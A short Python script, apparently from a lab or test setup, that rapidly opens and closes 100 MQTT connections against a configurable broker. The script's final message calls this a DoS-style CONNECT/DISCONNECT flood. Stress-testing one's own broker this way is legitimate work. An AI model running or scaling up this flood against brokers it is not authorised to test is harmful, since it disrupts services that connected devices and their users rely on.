import paho.mqtt.client as mqtt
import os, time

BROKER = os.getenv("MQTT_BROKER", "mqtt-broker")
PORT   = int(os.getenv("MQTT_PORT", 1883))

for i in range(100):
    client = mqtt.Client(client_id=f"dos{i}")
    try:
        client.connect(BROKER, PORT, keepalive=1)
        client.disconnect()
    except Exception as e:
        print(f"Iteration {i} error:", e)
    time.sleep(0.05)
print("Completed DoS-style CONNECT/DISCONNECT flood")
